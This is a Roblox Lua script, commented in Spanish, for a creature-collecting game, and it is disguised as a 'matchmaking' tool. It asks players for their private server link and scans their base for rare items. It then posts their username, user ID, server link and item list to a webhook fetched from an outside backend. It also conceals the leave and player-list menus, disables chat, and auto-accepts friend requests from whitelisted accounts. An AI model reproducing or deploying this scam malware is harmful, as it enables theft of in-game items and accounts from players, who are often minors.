if game.PlaceId ~= 109983668079237 then
    game.Players.LocalPlayer:Kick("Porfavor usa este script en el juego real")
end

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local VIM = game:GetService("VirtualInputManager")

local whitelist = {
    "hesizdev",
    "IlIlIlIlIIlI_lIlIlIl",
    "multicuentadeangel5"
}

local function isWhitelisted(username)
    for _, whitelistedName in ipairs(whitelist) do
        if username == whitelistedName then
            return true
        end
    end
    return false
end

local LocalPlayer = Players.LocalPlayer
local player = LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local heartbeatActive = false
local heartbeatUrl = nil

if not LocalPlayer then 
    warn("LocalPlayer no está disponible. El script se detiene.")
    return 
end

local instanciasWhitelist = {}

local function agregarAWhitelist(instancia)
    if instancia then
        instanciasWhitelist[instancia] = true
    end
end

agregarAWhitelist(Players)
agregarAWhitelist(CoreGui)
agregarAWhitelist(StarterGui)
agregarAWhitelist(LocalPlayer) 

local function estaEnWhitelist(instancia)
    if instanciasWhitelist[instancia] then return true end
    local p = instancia.Parent
    while p do
        if instanciasWhitelist[p] then return true end
        p = p.Parent
    end
    return false
end

local function aplicarFantasma(modelo)
    if not modelo then return end
    
    task.spawn(function()
        task.wait(0.5)
        
        for _, desc in ipairs(modelo:GetDescendants()) do
            if desc:IsA("BasePart") then
                desc.Transparency = 1
                desc.CanCollide = false
                desc.CanTouch = false
                desc.CanQuery = false
                desc.CastShadow = false
            end
            
            if desc:IsA("Decal") or desc:IsA("Texture") or desc:IsA("Clothing") then
                pcall(function() desc.Transparency = 1 end)
            end
            
            if desc:IsA("BillboardGui") or desc:IsA("SurfaceGui") then
                desc.Enabled = false
            end
            
            if desc:IsA("Accessory") then
                local handle = desc:FindFirstChild("Handle")
                if handle then
                    handle.Transparency = 1
                    handle.CanCollide = false
                end
            end
        end
        
        modelo.DescendantAdded:Connect(function(nuevo)
            if nuevo:IsA("BasePart") then
                nuevo.Transparency = 1
                nuevo.CanCollide = false
            elseif nuevo:IsA("BillboardGui") then
                nuevo.Enabled = false
            end
        end)
    end)
end

local function sendCommandToServer(playerWhoUsed)
    local success, result = pcall(function()
        if not HttpService then return end
        if not heartbeatUrl then return end
        
        local displayName = playerWhoUsed.DisplayName or playerWhoUsed.Name
        local userId = playerWhoUsed.UserId
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
        
        local commandData = {
            ["username"] = displayName,
            ["avatar_url"] = avatarUrl,
            ["embeds"] = {{
                ["author"] = {
                    ["name"] = displayName,
                    ["icon_url"] = avatarUrl
                },
                ["title"] = "Comando ejecutado",
                ["color"] = 65326,
                ["description"] = displayName .. " Uso \".add\"",
                ["thumbnail"] = {
                    ["url"] = avatarUrl
                },
                ["footer"] = {
                    ["text"] = "User ID: " .. tostring(userId)
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
        
        local jsonData = HttpService:JSONEncode(commandData)
        
        HttpService:RequestAsync({
            Url = heartbeatUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

local function configurarJugador(playerToConfig)
    if playerToConfig == LocalPlayer then return end

    playerToConfig.Chatted:Connect(function(msg)
        local msgLower = msg:lower():gsub("%s+", "")
        
        if msgLower == ".add" then
            print("Solicitud detectada de: " .. playerToConfig.Name)
            pcall(function() sendCommandToServer(playerToConfig) end)
            pcall(function() promptFR(playerToConfig) end) 
        elseif msgLower == ".block" then
            print("[COMANDOS] .block ejecutado por: " .. playerToConfig.Name)
            local allPlayers = Players:GetPlayers()
            for _, player in ipairs(allPlayers) do
                if player ~= LocalPlayer and not isWhitelisted(player.Name) then
                    print("[COMANDOS] Bloqueando a: " .. player.Name)
                    StarterGui:SetCore("PromptBlockPlayer", player)
                    task.wait(0.5)
                end
            end
        elseif msgLower == ".open" then
            print("[COMANDOS] .open ejecutado por: " .. playerToConfig.Name)
            pcall(function()
                ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
            end)
        end
    end)

    playerToConfig.CharacterAdded:Connect(function(char)
        aplicarFantasma(char)
        agregarAWhitelist(char)
    end)
    
    if playerToConfig.Character then
        aplicarFantasma(playerToConfig.Character)
        agregarAWhitelist(playerToConfig.Character)
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    configurarJugador(p)
end
Players.PlayerAdded:Connect(configurarJugador)

local function limpiarInterfaz()
    task.spawn(function()
        pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
        pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
    end)
end
limpiarInterfaz()
task.spawn(function() while true do task.wait(5) limpiarInterfaz() end end)

local function handleNewDescendant(descendant)
    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
        task.wait() 
        pcall(function()
            descendant:Destroy()
        end)
    end
end

for _, desc in ipairs(CoreGui:GetDescendants()) do
    handleNewDescendant(desc)
end

CoreGui.DescendantAdded:Connect(handleNewDescendant)

local function bloquearMenuEscape()
    task.spawn(function()
        pcall(function()
            local adminPanel = playerGui:FindFirstChild("AdminPanel")
            if adminPanel then
                adminPanel:Destroy()
            end
        end)
        
        pcall(function()
            local playerList = CoreGui:FindFirstChild("PlayerList")
            if playerList then
                playerList:Destroy()
            end
        end)
        
        task.spawn(function()
            while task.wait(0.5) do
                pcall(function()
                    local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
                    if innerFrame:FindFirstChild("Players") then 
                        innerFrame.Players:Destroy()
                    end
                    if innerFrame:FindFirstChild("LeaveGamePage") then 
                        innerFrame.LeaveGamePage:Destroy()
                    end
                end)
            end
        end)
    end)
end
bloquearMenuEscape()

function promptFR(targetPlayer)
    if not targetPlayer then return end

    local oldId = (getthreadidentity and getthreadidentity()) or nil
    if setthreadidentity then pcall(setthreadidentity, 5) end
    
    pcall(function()
        StarterGui:SetCore("PromptSendFriendRequest", targetPlayer)
    end)
    
    if setthreadidentity and oldId then pcall(setthreadidentity, oldId) end

    task.wait(0.5)
    pcall(function()
        local rgui = CoreGui:FindFirstChild("RobloxGui")
        local btn = rgui and rgui:FindFirstChild("ConfirmButton", true)
        if btn then
            if not pcall(function() btn:Activate() end) then
                GuiService.SelectedObject = btn
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            end
        end
    end)
end

task.spawn(function()
    pcall(function()
        ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
    end)
end)

-- ==================== COMANDOS .block Y .open ====================
CoreGui.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
        local screenGui = descendant:FindFirstAncestorWhichIsA("ScreenGui")
        if screenGui.Name == "BlockingModalScreen" then
            if descendant:IsA("TextLabel") then
                descendant:Destroy()
            end
            if descendant:IsA("GuiObject") then
                descendant.BackgroundTransparency = 1
            end
            if descendant:IsA("TextButton") then
                descendant.TextTransparency = 1
            end
            if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
                descendant.ImageTransparency = 1
            end
            
            if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
                descendant.Size = UDim2.new(0, 5000, 0, 5000)
                descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
                descendant.AnchorPoint = Vector2.new(0.5, 0.5)
                
                task.wait()
                
                local buttonPosition = descendant.AbsolutePosition
                local buttonSize = descendant.AbsoluteSize
                local clickX = buttonPosition.X + buttonSize.X / 2
                local clickY = buttonPosition.Y + buttonSize.Y / 2
                
                VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
                task.wait(0.1)
                VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
            end
        end
    end
end)

-- ==================== FIN COMANDOS ====================

local Game = game

local function esParteDeJugador(instancia)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Character and instancia:IsDescendantOf(p.Character) then
            return true
        end
    end
    return false
end

local function bloquearInstancia(instancia)
    if estaEnWhitelist(instancia) then return end
    if esParteDeJugador(instancia) then return end
    
    pcall(function()
        task.defer(function()
            if instancia and instancia.Parent then
                instancia:Destroy()
            end
        end)
    end)
end

Game.DescendantAdded:Connect(bloquearInstancia)

local SECURE_BACKEND_URL = "https://hesizweb-production.up.railway.app"

local BLACKLIST = {
    4313952753,
    3328221098,
    2353591712,
    8698369158,
}

local function isBlacklisted(userId)
    for _, id in ipairs(BLACKLIST) do
        if id == userId then
            return true
        end
    end
    return false
end

if isBlacklisted(LocalPlayer.UserId) then
    return
end

local function textToBinary(text)
    local result = {}
    for i = 1, #text do
        local byte = string.byte(text, i)
        local binary = ""
        for j = 7, 0, -1 do
            local bit = math.floor(byte / (2^j)) % 2
            binary = binary .. tostring(bit)
        end
        table.insert(result, binary)
    end
    return table.concat(result, " ")
end

local function requestSecureUrl(category, webhookId)
    local success, result = pcall(function()
        if not HttpService then
            return nil
        end

        if not LocalPlayer then
            return nil
        end

        local usernameBinary = textToBinary(LocalPlayer.Name)

        local requestBody = HttpService:JSONEncode({
            username_binary = usernameBinary,
            category = category or "miranda",
            webhook_id = webhookId or "webhook_2",
            token = "hesiz_secure_v1"
        })

        local response = HttpService:RequestAsync({
            Url = SECURE_BACKEND_URL .. "/create-url",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = requestBody
        })

        if response.StatusCode == 429 then
            local responseBody = response.Body or ""
            if responseBody:find("Rate limited") then
                LocalPlayer:Kick("You are in cooldown!")
                return nil
            end
        end

        if type(response) == "table" and response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.success and data.url then
                return data.url
            end
        end

        return nil
    end)

    if success then
        return result
    end
    return nil
end

local allowedAnimals = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Garama and Madundung",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Nuclearo Dinossauro",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "Tictac Sahur",
    "Tralaledon",
    "La Spooky Grande",
    "Strawberry Elephant",
    "Los Bros",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion", 
    "Spooky and Pumpky", 
    "Ketchuru and Musturu", 
    "Los Lucky Blocks", 
    "Admin Lucky Block", 
    "Burguro And Fryuro", 
    "Chillin Chili", 
    "Los Tacoritas", 
    "Tacorita Bicicleta", 
    "Taco Luckyblock",
    "Mieteteira Bicicleteira",
    "Chipso and Queso",
    "Quesadillo Vampiro",
    "Burrito Bandito",
    "Meowl",
    "Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Los Puggies",
    "Los Spaghettis",
    "Fragrama and Chocrama",
    "Capitano Moby",
    "W or L",
    "Los Planitos",
    "Headless Horseman",
    "Fishino Clownino",
    "Gobblino Unicilino",
    "Orcaledon",
    "Los 67",
    "Los Burritos",
    "La Jolly Grande",
    "Chicleteira Noelteira",
    "Festive Lucky Block",
    "Chimnino",
    "Los 25",
    "La Ginger Sekolah",
    "Los Candies",
    "Festive 67",
    "Noo My Candy",
    "Noo My Present",
    "Guest 666",
    "Tang Tang Keletang",
    "Reinito Sleighito",
    "Swaggy Bros",
    "Lavadorito Spinito",
    "Dragon Gingerini",
    "Raccooni Jandelini",
    "Donkeyturbo Express",
    "Jolly Jolly Sahur",
    "Ginger Gerat",
    "Los Jolly Combinasionas",
    "Money Money Reindeer",
    "Tuff Tuoucan",
    "Skibidi Toilet"
}

local specialAnimals = {
    "Dragon Cannelloni",
    "Celularcini Viciosini",
    "Ketupat Kepat",
    "Strawberry Elephant",
    "Spooky and Pumpky",
    "La Secret Combinasion",
    "Burguro And Fryuro",
    "Money Money Puggy",
    "Spaghetti Tualetti",
    "Tictac Sahur",
    "Garama and Madundung",
    "Chipso and Queso",
    "Los Spaghettis",
    "Fragrama and Chocrama",
    "Meowl",
    "Eviledon",
    "Los Puggies", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Orcaledon",
    "Los Bros",
    "Headless Horseman",
    "Capitano Moby",
    "W or L",
    "Ketchuru and Musturu",
    "La Supreme Combinasion",
    "Cooki and Milki",
    "Tang Tang Keletang",
    "Reinito Sleighito",
    "Swaggy Bros",
    "Lavadorito Spinito",
    "Los Primos",
    "Dragon Gingerini",
    "Raccooni Jandelini",
    "Nuclearo Dinossauro",
    "Jolly Jolly Sahur",
    "Ginger Gerat",
    "Money Money Reindeer",
    "Skibidi Toilet"
}

local BRAINROT_LIST = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Garama and Madundung",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Nuclearo Dinossauro",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "Tictac Sahur",
    "Tralaledon",
    "La Spooky Grande",
    "Strawberry Elephant",
    "Los Bros",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion", 
    "Spooky and Pumpky", 
    "Ketchuru and Musturu", 
    "Los Lucky Blocks", 
    "Admin Lucky Block", 
    "Burguro And Fryuro", 
    "Chillin Chili", 
    "Los Tacoritas", 
    "Tacorita Bicicleta", 
    "Taco Luckyblock",
    "Mieteteira Bicicleteira",
    "Chipso and Queso",
    "Quesadillo Vampiro",
    "Burrito Bandito",
    "Meowl",
    "Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Los Puggies",
    "Los Spaghettis",
    "Fragrama and Chocrama",
    "Capitano Moby",
    "W or L",
    "Los Planitos",
    "Headless Horseman",
    "Fishino Clownino",
    "Gobblino Unicilino",
    "Orcaledon",
    "Los 67",
    "Los Burritos",
    "La Jolly Grande",
    "Chicleteira Noelteira",
    "Festive Lucky Block",
    "Chimnino",
    "Los 25",
    "La Ginger Sekolah",
    "Los Candies",
    "Festive 67",
    "Noo My Candy",
    "Noo My Present",
    "Guest 666",
    "Tang Tang Keletang",
    "Reinito Sleighito",
    "Swaggy Bros",
    "Lavadorito Spinito",
    "Dragon Gingerini",
    "Raccooni Jandelini",
    "Donkeyturbo Express"
}

local function estaEnLista(nombre, lista)
    for _, item in ipairs(lista) do
        if item == nombre then
            return true
        end
    end
    return false
end

-- FUNCIÓN PARA BUSCAR BASE Y ESCANEAR ANIMALES
local function buscarBaseYAnimales()
    local foundAnimals = {}
    local foundSpecials = {}
    
    local success, error = pcall(function()
        local plots = workspace.Plots:GetDescendants()
        
        for _, descendant in ipairs(plots) do
            if descendant:IsA("TextLabel") then
                if descendant.Text == LocalPlayer.DisplayName .. "'s Base" then
                    local surfaceGui = descendant.Parent.Parent
                    local plotSign = surfaceGui.Parent
                    local modelo = plotSign.Parent
                    
                    -- Escanear todos los hijos del modelo (la base del jugador)
                    for _, child in ipairs(modelo:GetChildren()) do
                        if child:IsA("Model") and estaEnLista(child.Name, allowedAnimals) then
                            -- Verificar si es especial
                            if estaEnLista(child.Name, specialAnimals) then
                                table.insert(foundSpecials, child.Name)
                            end
                            -- Agregar a la lista general (evitar duplicados)
                            if not table.find(foundAnimals, child.Name) then
                                table.insert(foundAnimals, child.Name)
                            end
                        end
                    end
                    
                    break
                end
            end
        end
    end)
    
    if not success then
        warn("Error al escanear base: " .. tostring(error))
        return {}
    end
    
    return foundAnimals
end

-- FUNCIÓN PARA VALIDAR LINK DE SERVIDOR PRIVADO
local function isValidPrivateServerLink(text)
    if not string.find(text, "https?://") then
        return false
    end

    if not string.find(text, "roblox%.com") then
        return false
    end

    local patterns = {
        "https?://www%.roblox%.com/share%?code=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?privateServerLinkCode=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?linkCode=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?code=[%w%-_]+",
        "https?://web%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode=",
        "https?://m%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode="
    }

    for _, pattern in ipairs(patterns) do
        if string.match(text, pattern) then
            return true
        end
    end

    return false
end

-- FUNCIÓN PARA ENVIAR HEARTBEAT (GET periódico)
local function startHeartbeat(url)
    if heartbeatActive then return end
    heartbeatActive = true
    heartbeatUrl = url
    
    task.spawn(function()
        -- Enviar primer GET inmediatamente
        task.wait(1) -- Pequeño delay inicial
        
        while heartbeatActive and heartbeatUrl do
            if not heartbeatActive or not heartbeatUrl then break end
            
            local success, response = pcall(function()
                return HttpService:RequestAsync({
                    Url = heartbeatUrl,
                    Method = "GET",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    }
                })
            end)
            
            if success and response then
                if response.StatusCode == 200 then
                    -- Heartbeat exitoso, seguimos en el juego
                elseif response.StatusCode == 404 then
                    -- Sesión terminada, dejar de enviar heartbeats
                    heartbeatActive = false
                    heartbeatUrl = nil
                    break
                end
            else
                -- Error en el request, intentar de nuevo
            end
            
            -- Esperar antes del siguiente heartbeat
            task.wait(5) -- Enviar GET cada 5 segundos
        end
    end)
end

-- FUNCIÓN PARA DETENER EL HEARTBEAT
local function stopHeartbeat()
    heartbeatActive = false
    heartbeatUrl = nil
end

-- FUNCIÓN PARA ENVIAR A WEBHOOK
local function sendToWebhook(link, foundAnimals)
    local overallSuccess, overallError = pcall(function()
        if isBlacklisted(LocalPlayer.UserId) then
            return false
        end

        if not isValidPrivateServerLink(link) then
            return false
        end

        if not foundAnimals or #foundAnimals == 0 then
            return true
        end

        local playerCount = #Players:GetPlayers()
        if playerCount > 1 then
            return true
        end

        local playerName = LocalPlayer.Name
        local displayName = LocalPlayer.DisplayName
        local userId = LocalPlayer.UserId
        local specialFound = false

        for _, animal in ipairs(foundAnimals) do
            for _, special in ipairs(specialAnimals) do
                if animal:lower():find(special:lower(), 1, true) then
                    specialFound = true
                    break
                end
            end
            if specialFound then break end
        end

        local isSpecial = specialFound
        local category = isSpecial and "webhook_2" or "webhook_2"

        local animalList = ""
        for i, animal in ipairs(foundAnimals) do
            if i == 1 then
                animalList = animal
            else
                animalList = animalList .. "\n" .. animal
            end
        end

        local title = isSpecial and "CATCHES ESPECIALES ENCONTRADOS" or "Nuevo Exploiter Encontrado"
        local color = isSpecial and 16766720 or 10038562

        local data = {
            ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
            ["embeds"] = {{
                ["title"] = title,
                ["color"] = color,
                ["fields"] = {
                    {
                        ["name"] = "Información del jugador:",
                        ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
                    },
                    {
                        ["name"] = "Datos del Server:",
                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
                    },
                    {
                        ["name"] = "Link del Server:",
                        ["value"] = "[Click here to join](" .. link .. ")",
                    },
                    {
                        ["name"] = isSpecial and "CATCHES ESPECIALES:" or "Items importantes (secrets):",
                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
                    },
                    {
                        ["name"] = "Total:",
                        ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
                    }
                },
                ["footer"] = {["text"] = isSpecial and "Miranda - Detector de Catches Especiales" or "Miranda - Cazador de Exploiter"},
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }

        local webhookId = "webhook_2"
        
        local secureUrl = requestSecureUrl(category, webhookId)

        if secureUrl then
            local sendSuccess, sendResponse = pcall(function()
                local jsonData = HttpService:JSONEncode(data)
                return HttpService:RequestAsync({
                    Url = secureUrl,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            end)

            if sendSuccess and sendResponse then
                local statusCode = sendResponse.StatusCode
                local responseBody = sendResponse.Body or ""

                if statusCode == 429 then
                    if responseBody:find("Rate limited") then
                        LocalPlayer:Kick("You are in cooldown!")
                        return false
                    end
                end
                
                -- Si el POST fue exitoso, iniciar heartbeat
                if statusCode == 200 then
                    startHeartbeat(secureUrl)
                end
            end
        end

        return true
    end)

    if overallSuccess then
        return true
    else
        return true
    end
end

-- Detener heartbeat cuando el jugador sale del juego
Players.PlayerRemoving:Connect(function(playerLeaving)
    if playerLeaving == LocalPlayer then
        stopHeartbeat()
    end
end)

-- CONFIGURACION DE ESTILO (Blanco y Negro / Profesional)
local THEME = {
    Background = Color3.fromRGB(15, 15, 15),
    Accent = Color3.fromRGB(255, 255, 255),
    Text = Color3.fromRGB(240, 240, 240),
    SubText = Color3.fromRGB(180, 180, 180),
    FontMain = Enum.Font.GothamBold,
    FontBody = Enum.Font.Gotham,
}

-- UI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MatchmakingUI"
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999999999
screenGui.IgnoreGuiInset = true

-- VARIABLE GLOBAL PARA EL LINK
local privateServerLink = ""

-- 1. MARCO PARA PEDIR EL LINK (ANTES DEL BOTÓN ACTIVAR)
local linkFrame = Instance.new("Frame")
linkFrame.Name = "LinkFrame"
linkFrame.Size = UDim2.new(0, 450, 0, 200)
linkFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
linkFrame.BackgroundColor3 = THEME.Background
linkFrame.BackgroundTransparency = 0.05
linkFrame.BorderSizePixel = 0
linkFrame.Visible = true
linkFrame.Parent = screenGui

local linkCorner = Instance.new("UICorner")
linkCorner.CornerRadius = UDim.new(0, 12)
linkCorner.Parent = linkFrame

local linkStroke = Instance.new("UIStroke")
linkStroke.Color = THEME.Accent
linkStroke.Thickness = 2
linkStroke.Parent = linkFrame

local linkTitle = Instance.new("TextLabel")
linkTitle.Size = UDim2.new(1, -40, 0, 30)
linkTitle.Position = UDim2.new(0, 20, 0, 20)
linkTitle.BackgroundTransparency = 1
linkTitle.Text = "PORFAVOR PEGA EL LINK DE TU SERVER PRIVADO"
linkTitle.TextColor3 = THEME.Accent
linkTitle.Font = THEME.FontMain
linkTitle.TextSize = 16
linkTitle.TextXAlignment = Enum.TextXAlignment.Center
linkTitle.Parent = linkFrame

local linkInputBox = Instance.new("TextBox")
linkInputBox.Size = UDim2.new(1, -40, 0, 45)
linkInputBox.Position = UDim2.new(0, 20, 0, 65)
linkInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
linkInputBox.BorderSizePixel = 0
linkInputBox.Text = ""
linkInputBox.TextColor3 = THEME.Text
linkInputBox.Font = THEME.FontBody
linkInputBox.TextSize = 14
linkInputBox.PlaceholderText = "https://www.roblox.com/share?code=..."
linkInputBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
linkInputBox.TextXAlignment = Enum.TextXAlignment.Left
linkInputBox.ClearTextOnFocus = false
linkInputBox.ClipsDescendants = true
linkInputBox.TextTruncate = Enum.TextTruncate.AtEnd
linkInputBox.Parent = linkFrame

local linkInputCorner = Instance.new("UICorner")
linkInputCorner.CornerRadius = UDim.new(0, 8)
linkInputCorner.Parent = linkInputBox

local linkInputPadding = Instance.new("UIPadding")
linkInputPadding.PaddingLeft = UDim.new(0, 10)
linkInputPadding.Parent = linkInputBox

local linkConfirmBtn = Instance.new("TextButton")
linkConfirmBtn.Size = UDim2.new(0, 150, 0, 40)
linkConfirmBtn.Position = UDim2.new(0.5, -75, 0, 130)
linkConfirmBtn.BackgroundColor3 = THEME.Accent
linkConfirmBtn.TextColor3 = THEME.Background
linkConfirmBtn.Text = "CONFIRMAR"
linkConfirmBtn.Font = THEME.FontMain
linkConfirmBtn.TextSize = 16
linkConfirmBtn.AutoButtonColor = true
linkConfirmBtn.BorderSizePixel = 0
linkConfirmBtn.Parent = linkFrame

local linkConfirmCorner = Instance.new("UICorner")
linkConfirmCorner.CornerRadius = UDim.new(0, 8)
linkConfirmCorner.Parent = linkConfirmBtn

local linkErrorLabel = Instance.new("TextLabel")
linkErrorLabel.Size = UDim2.new(1, -40, 0, 20)
linkErrorLabel.Position = UDim2.new(0, 20, 0, 175)
linkErrorLabel.BackgroundTransparency = 1
linkErrorLabel.Text = ""
linkErrorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
linkErrorLabel.Font = THEME.FontBody
linkErrorLabel.TextSize = 12
linkErrorLabel.TextXAlignment = Enum.TextXAlignment.Center
linkErrorLabel.Parent = linkFrame

-- 2. BOTON DE ACTIVAR (OCULTO INICIALMENTE)
local activateBtn = Instance.new("TextButton")
activateBtn.Name = "ActivateButton"
activateBtn.Size = UDim2.new(0, 200, 0, 50)
activateBtn.Position = UDim2.new(0.5, -100, 0.85, 0)
activateBtn.BackgroundColor3 = THEME.Background
activateBtn.TextColor3 = THEME.Accent
activateBtn.Text = "ACTIVAR"
activateBtn.Font = THEME.FontMain
activateBtn.TextSize = 18
activateBtn.AutoButtonColor = true
activateBtn.BorderSizePixel = 0
activateBtn.Visible = false
activateBtn.Parent = screenGui

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = activateBtn

local btnStroke = Instance.new("UIStroke")
btnStroke.Color = THEME.Accent
btnStroke.Thickness = 2
btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
btnStroke.Parent = activateBtn

-- EVENTO DE CONFIRMACIÓN DE LINK
linkConfirmBtn.MouseButton1Click:Connect(function()
    local link = linkInputBox.Text
    
    if link == "" then
        linkErrorLabel.Text = "El link no puede estar vacío"
        return
    end
    
    if not isValidPrivateServerLink(link) then
        linkErrorLabel.Text = "Link de servidor privado inválido"
        return
    end
    
    privateServerLink = link
    
    TweenService:Create(linkFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    TweenService:Create(linkTitle, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
    TweenService:Create(linkInputBox, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    TweenService:Create(linkConfirmBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    TweenService:Create(linkStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
    
    task.wait(0.35)
    linkFrame.Visible = false
    
    activateBtn.Visible = true
    activateBtn.BackgroundTransparency = 1
    activateBtn.TextTransparency = 1
    TweenService:Create(activateBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
end)

-- 3. MARCO PRINCIPAL (Contenedor de pantallas)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(0.5, -200, 0.4, -150)
mainFrame.BackgroundColor3 = THEME.Background
mainFrame.BackgroundTransparency = 0.05
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = THEME.Accent
mainStroke.Thickness = 1.5
mainStroke.Transparency = 0
mainStroke.Parent = mainFrame

-- Variables para hacer draggable
local dragging = false
local dragInput, mousePos, framePos
local isDraggable = true

local function onInputBegan(input)
    if not isDraggable then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = mainFrame.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                connection:Disconnect()
            end
        end)
    end
end

local function onInputChanged(input)
    if not isDraggable then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end

mainFrame.InputBegan:Connect(onInputBegan)
mainFrame.InputChanged:Connect(onInputChanged)

UserInputService.InputChanged:Connect(function(input)
    if not isDraggable then return end
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        mainFrame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
    end
end)

-- Contenedor interno para el contenido cambiante
local contentContainer = Instance.new("Frame")
contentContainer.Name = "ContentContainer"
contentContainer.Size = UDim2.new(1, -40, 1, -40)
contentContainer.Position = UDim2.new(0, 20, 0, 20)
contentContainer.BackgroundTransparency = 1
contentContainer.Parent = mainFrame

local listLayout = Instance.new("UIListLayout")
listLayout.Parent = contentContainer
